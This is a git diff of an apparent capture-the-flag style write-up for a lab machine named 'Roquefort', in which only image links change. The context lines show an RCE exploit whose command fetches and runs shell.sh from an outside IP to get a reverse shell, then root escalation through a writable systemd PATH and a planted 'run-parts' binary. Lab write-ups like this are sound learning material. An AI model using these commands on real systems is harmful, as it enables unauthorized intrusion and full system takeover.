@@ -23,7 +23,7 @@ FTP does not allow for anonymous logins.
 
 Only port 3000 has a webpage:
 
-![](<../../../.gitbook/assets/image%20(504).png>)
+![](../../../.gitbook/assets/roquefort-4.png)
 
 In the bottom left, we can see the version, which is vulnerable to RCE:
 
@@ -49,7 +49,7 @@ CMD = 'wget http://192.168.45.196:21/shell.sh && bash shell.sh'
 
 We would then get a reverse shell:
 
-![](<../../../.gitbook/assets/image%20(1547).png>)
+![](../../../.gitbook/assets/roquefort-1.png)
 
 ## Privilege Escalation
 
@@ -57,7 +57,7 @@ We would then get a reverse shell:
 
 `linpeas.sh` picked up that we can write to the Systemd PATH:
 
-![](<../../../.gitbook/assets/image%20(490).png>)
+![](../../../.gitbook/assets/roquefort-3.png)
 
 This means we just need to find some process from `root` that doesn't use the full PATH. I used `pspy64` to find such a process.
 
@@ -82,4 +82,4 @@ chmod 777 run-parts
 
 Then, start a listener port and wait for `root` to execute the binary:
 
-![](<../../../.gitbook/assets/image%20(3443).png>)
+![](../../../.gitbook/assets/roquefort-2.png)
